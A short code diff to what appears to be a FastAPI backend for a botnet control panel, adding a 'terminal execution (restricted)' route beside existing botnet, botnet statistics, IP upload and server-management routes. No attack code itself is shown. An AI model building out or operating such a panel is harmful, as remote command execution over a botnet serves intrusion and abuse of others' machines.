@@ -18,6 +18,7 @@ from router.botnet import router as botnet_router
 from router.amount import router as amount_router
 from api_ip_upload import router as ip_upload_router
 from router.server import router as server_router
+from router.terminal import router as terminal_router
 from router.botnet_stats import router as botnet_stats_router
 
 import logging
@@ -94,6 +95,9 @@ app.include_router(server_router, prefix="/api/server", tags=["server-management
 
 # 包含僵尸网络统计路由
 app.include_router(botnet_stats_router, prefix="/api/stats", tags=["botnet-statistics"])
+
+# 终端执行路由（受限）
+app.include_router(terminal_router, prefix="/api", tags=["terminal"])
 
 
 # 数据模型
